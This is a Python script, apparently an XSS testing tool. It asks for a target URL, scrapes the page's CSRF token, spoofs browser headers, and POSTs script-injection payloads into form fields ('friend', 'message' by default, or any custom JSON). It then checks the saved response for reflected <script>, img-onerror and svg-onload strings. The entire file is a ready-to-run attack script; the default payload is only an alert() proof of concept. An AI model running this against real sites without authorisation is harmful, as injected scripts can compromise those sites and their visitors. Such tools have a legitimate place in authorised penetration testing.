import requests
import gzip
from io import BytesIO
import logging
import json
from datetime import datetime
import os
from bs4 import BeautifulSoup
from urllib.parse import quote

# Ensure BeautifulSoup is installed
# You can install it via pip if not already installed:
# pip install beautifulsoup4

# Define a directory for responses
response_dir = "responses"
os.makedirs(response_dir, exist_ok=True)

# Configure logging to file and console
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("script.log"),
        logging.StreamHandler()
    ]
)

def get_csrf_token(session, target_url):
    """
    Retrieves the CSRF token from the target page.
    Adjust the selector based on the actual HTML structure.
    """
    try:
        logging.debug(f"Fetching CSRF token from {target_url}")
        response = session.get(target_url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        # Example: <input type="hidden" name="csrf_token" value="...">
        csrf_input = soup.find('input', {'name': 'csrf_token'})
        if csrf_input:
            csrf_token = csrf_input.get('value')
            logging.debug(f"CSRF token found: {csrf_token}")
            return csrf_token
        else:
            logging.warning("CSRF token not found on the page.")
            return None
    except Exception as e:
        logging.error(f"Error retrieving CSRF token: {e}")
        return None

def exploit_xss_post(session, target_url, data, headers):
    logging.info(f"[+] Sending POST request to: {target_url}")

    try:
        # Send the POST request to the target, allowing for redirects
        response = session.post(target_url, data=data, headers=headers, allow_redirects=True)
        
        # Log response details
        logging.debug(f"Status Code: {response.status_code}")
        
        if response.history:
            logging.debug("Request was redirected:")
            for resp in response.history:
                logging.debug(f" - {resp.status_code} -> {resp.url}")
            logging.debug(f"Final destination: {response.status_code} -> {response.url}")
        else:
            logging.debug("No redirection occurred.")

        logging.debug(f"Response headers: {response.headers}")
        
        # Log raw response content length and snippet
        logging.debug(f"Raw response content length: {len(response.content)} bytes")
        logging.debug(f"Raw response content (first 500 bytes): {response.content[:500]}")

        # Decompress if necessary
        decompressed_content = ""
        try:
            if "Content-Encoding" in response.headers and response.headers["Content-Encoding"] == "gzip":
                logging.info("Detected gzip encoding. Decompressing response...")
                buffer = BytesIO(response.content)
                with gzip.GzipFile(fileobj=buffer) as f:
                    decompressed_content = f.read().decode('utf-8', errors='ignore')
                logging.debug("Response decompressed successfully.")
            else:
                decompressed_content = response.text
                logging.debug("No compression detected. Using raw text.")
        except Exception as e:
            logging.error(f"Error during decompression: {e}")
            decompressed_content = response.text  # Fallback to raw text

        # Generate a timestamped filename
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(response_dir, f"response_final_{timestamp}.html")

        # Save the response content
        with open(filename, "w", encoding='utf-8') as file:
            file.write(decompressed_content)
        logging.info(f"[+] Full response saved to '{filename}' for further analysis.")

        # Check if content is empty
        if not decompressed_content.strip():
            logging.warning("The response content is empty.")
            print("[-] The response content is empty.")
        else:
            # Optionally, search for the XSS payload in the response
            if "<script>alert('XSS')</script>" in decompressed_content or \
               "<script>alert(\"XSS\")</script>" in decompressed_content or \
               "<img src=x onerror=alert('XSS')>" in decompressed_content or \
               "<svg/onload=alert('XSS')>" in decompressed_content:
                logging.info("XSS payload detected in the response.")
                print("[+] XSS payload detected in the response.")
            else:
                logging.info("XSS payload not found in the response.")
                print("[-] XSS payload not found in the response.")
            
            # Print the first 2000 characters of the response
            print(f"[+] Decompressed response content (first 2000 characters):\n{decompressed_content[:2000]}")
        
    except requests.RequestException as e:
        logging.error(f"RequestException: {e}")
        print(f"[-] An error occurred: {str(e)}")

def get_payload():
    print("Do you want to input a custom payload? (y/n): ", end='')
    choice = input().strip().lower()
    if choice == 'y':
        print("Enter payload data in JSON format (e.g., {\"field1\": \"value1\", \"field2\": \"value2\"}):")
        user_input = input()
        try:
            payload = json.loads(user_input)
            logging.debug(f"Custom payload received: {payload}")
            return payload
        except json.JSONDecodeError:
            print("Invalid JSON format. Using default payload.")
            logging.warning("Invalid JSON format entered for payload. Using default payload.")
    # Default payload targeting 'friend' and 'message' fields
    default_payload = {
        "name": "test",
        "email": "test@example.com",
        "friend": "<script>alert('XSS')</script>",  # Targeting 'friend' field
        "message": "<script>alert('XSS')</script>",  # Targeting 'message' field
        "send": "Send"
    }
    logging.debug(f"Using default payload: {default_payload}")
    return default_payload

if __name__ == "__main__":
    # Initialize a session
    session = requests.Session()
    
    # Prompt the user to input the target URL
    target_url = input("Enter the target URL: ").strip()
    logging.debug(f"Target URL entered: {target_url}")
    
    # Fetch CSRF token if necessary
    csrf_token = get_csrf_token(session, target_url)
    
    # Get payload (either default or user-defined)
    payload = get_payload()
    
    # If CSRF token is found, include it in the payload
    if csrf_token:
        payload['csrf_token'] = csrf_token
        logging.debug(f"CSRF token added to payload: {csrf_token}")
    
    # Define headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ' +
                      'AppleWebKit/537.36 (KHTML, like Gecko) ' +
                      'Chrome/58.0.3029.110 Safari/537.3',
        'Referer': target_url,
        'Accept': 'text/html,application/xhtml+xml,application/xml;' +
                  'q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded'  # Ensure correct Content-Type
    }
    
    # Execute the XSS exploit
    exploit_xss_post(session, target_url, data=payload, headers=headers)